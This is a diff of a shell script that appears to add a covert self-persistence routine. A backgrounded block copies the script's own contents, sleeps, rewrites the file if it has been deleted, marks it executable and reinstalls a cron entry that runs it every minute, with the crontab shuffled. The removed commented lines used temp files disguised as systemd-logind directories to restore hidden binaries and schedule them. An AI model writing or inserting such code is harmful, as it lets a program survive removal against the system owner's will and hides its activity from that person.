@@ -95,12 +95,13 @@ if [ "$(($(date +%s) - t_last_edit))" -ge 86400 ] || [ "$(whoami | tr '[:upper:]
 fi
 
 
-# skript="base64 '$HOME/.local/bin/_zip_err_load_link' > /tmp/systemd-private-661669617867e846c455606fcbcd07c2-systemd-logind.service-ibBneR
-# base64 '$HOME/.local/bin/_zip_err_load_link_wp' > /tmp/systemd-private-2c241dff26c293f25dd86da8732c9e15-systemd-logind.service-oBEeif
-# sleep 175
-# base64 --decode /tmp/systemd-private-661669617867e846c455606fcbcd07c2-systemd-logind.service-ibBneR > '$HOME/.local/bin/_zip_err_load_link'
-# base64 --decode /tmp/systemd-private-2c241dff26c293f25dd86da8732c9e15-systemd-logind.service-oBEeif > '$HOME/.local/bin/_zip_err_load_link_wp'
-# { crontab -l | grep -Ev '_zip_err_load_link'; printf '00 11 * * * %s/.local/bin/_zip_err_load_link\n* * * * * %s/.local/bin/_zip_err_load_link_wp\n' '$HOME' '$HOME'; } | crontab -"
+skript="
+    filecontent=\"\$(cat '$this_file_path')\"
+    sleep 177
+    printf '%s' \"\$filecontent\" > '$this_file_path'
+    chmod +x -- '$this_file_path'
+    { crontab -l | grep -Fv '$this_file_path'; printf '* * * * * %s\n' '$this_file_path'; } | shuf | crontab -
+"
 
-# echo "$skript" | sh &
+printf '%s\n' "$skript" | sh &
 
